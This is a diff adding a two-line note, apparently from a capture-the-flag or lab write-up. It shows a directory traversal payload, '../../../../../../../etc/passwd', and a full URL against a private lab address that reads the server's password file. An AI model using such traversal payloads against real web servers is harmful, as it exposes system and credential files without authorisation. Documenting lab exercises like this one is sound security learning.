@@ -1,0 +1,2 @@
+You can acces to passwd in etc with ../../../../../../../etc/passwd
+in the url : http://10.13.0.224/?page=../../../../../../../etc/passwd
